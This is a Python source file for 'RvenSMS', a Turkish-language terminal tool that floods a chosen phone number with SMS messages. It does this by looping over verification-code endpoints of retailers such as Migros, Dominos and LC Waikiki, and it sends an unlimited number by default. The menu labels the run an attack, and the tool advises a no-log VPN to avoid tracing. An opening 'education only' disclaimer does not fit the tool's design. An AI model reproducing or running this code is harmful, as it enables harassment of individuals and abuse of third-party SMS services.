import os
import sys
import time
import threading
from colorama import init, Fore, Style
from sms_api import SendSms

init(autoreset=True)

class RvenTerminalUI:
    def __init__(self):
        self.running = False
        self.phone_number = ""
        self.target_count = 0

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_intro(self):
        self.clear_screen()
        print(Fore.RED + Style.BRIGHT + "==================================================")
        print(Fore.YELLOW + Style.BRIGHT + "            YASAL UYARI VE BİLGİLENDİRME          ")
        print(Fore.RED + Style.BRIGHT + "==================================================")
        print(Fore.WHITE + "Bu uygulama siber güvenlik eğitimi için gerçekleştirilmiştir, kendi telefon numaranız dışında çalıştırmanız tamamen sizin iradenizdir ve kodun yapımcısı sorumlu tutulamaz.\n")
        print(Fore.CYAN + "Termux sistemi hazırlanıyor, arayüz birazdan açılacak...")
        for i in range(5, 0, -1):
            print(Fore.MAGENTA + f"[{i}] saniye kaldı...", end="\r")
            time.sleep(1)
        print("\n")

    def draw_banner(self):
        print(Fore.MAGENTA + Style.BRIGHT + "==================================================")
        print(Fore.CYAN + Style.BRIGHT + "            RvenSMS v1.0 - rven_x               ")
        print(Fore.MAGENTA + Style.BRIGHT + "==================================================")

    def render_menu(self):
        self.clear_screen()
        self.draw_banner()
        print(Fore.YELLOW + f" Geliştirici: rven_x\n")
        print(Fore.GREEN + "[1]" + Style.RESET_ALL + f" Hedef Numara   : " + Fore.YELLOW + (self.phone_number if self.phone_number else "Girilmedi (+90)"))
        print(Fore.GREEN + "[2]" + Style.RESET_ALL + f" Gönderilecek Adet: " + Fore.YELLOW + (str(self.target_count) if self.target_count > 0 else "Sınırsız"))
        print(Fore.GREEN + "[3]" + Style.RESET_ALL + f" SALDIRIYI BAŞLAT")
        print(Fore.GREEN + "[4]" + Style.RESET_ALL + f" Çıkış\n")
        print(Fore.MAGENTA + "--------------------------------------------------")
        print(Fore.BLUE + Style.BRIGHT + "İşlemleri uygularken güvenilir ve log tutmayan bir VPN kullanmanız önerilir.\n" + Style.RESET_ALL)

    def run(self):
        self.show_intro()
        while True:
            self.render_menu()
            choice = input(Fore.CYAN + "Seçiminiz (1-4): " + Style.RESET_ALL).strip()
            
            if choice == "1":
                num = input(Fore.CYAN + "\nTelefon Numarası (Başında 0 yok, örn: 5XXXXXXXXX): " + Style.RESET_ALL).strip()
                if num.isdigit() and len(num) >= 10:
                    self.phone_number = num
            elif choice == "2":
                try:
                    adet = int(input(Fore.CYAN + "\nKaç adet atılsın? (0 = Sınırsız): " + Style.RESET_ALL).strip())
                    self.target_count = adet if adet >= 0 else 0
                except:
                    pass
            elif choice == "3":
                if not self.phone_number:
                    input(Fore.RED + "\nÖnce geçerli bir numara girmelisin! ENTER'a bas.")
                    continue
                self.start_attack_screen()
            elif choice == "4":
                sys.exit()

    def start_attack_screen(self):
        self.running = True
        self.clear_screen()
        self.draw_banner()
        print(Fore.RED + Style.BRIGHT + ">>> SALDIRI BAŞLATILDI! DURDURMAK İÇİN [Ctrl + C] YAPABİLİRSİN <<<\n")
        print(Fore.MAGENTA + "--------------------------------------------------\n")
        
        worker = threading.Thread(target=self.launch_attack_worker, daemon=True)
        worker.start()
        
        try:
            while worker.is_alive():
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
            print(Fore.RED + "\n[!] Saldırı kullanıcı tarafından durduruldu.")
            time.sleep(1)

    def launch_attack_worker(self):
        sms = SendSms(self.phone_number)
        methods = [
            sms.Bim, sms.Koton, sms.KahveDunyasi, sms.Dominos,
            sms.File, sms.Metro, sms.LcWaikiki, sms.Migros, sms.Letgo
        ]
        
        sent_count = 0
        while self.running:
            for m in methods:
                if not self.running:
                    break
                if self.target_count > 0 and sent_count >= self.target_count:
                    self.running = False
                    print(Fore.GREEN + f"\n[!] Hedeflenen {self.target_count} adet SMS isteği tamamlandı!")
                    return
                try:
                    m()
                    sent_count += 1
                except Exception:
                    pass

if __name__ == "__main__":
    try:
        app = RvenTerminalUI()
        app.run()
    except KeyboardInterrupt:
        sys.exit()
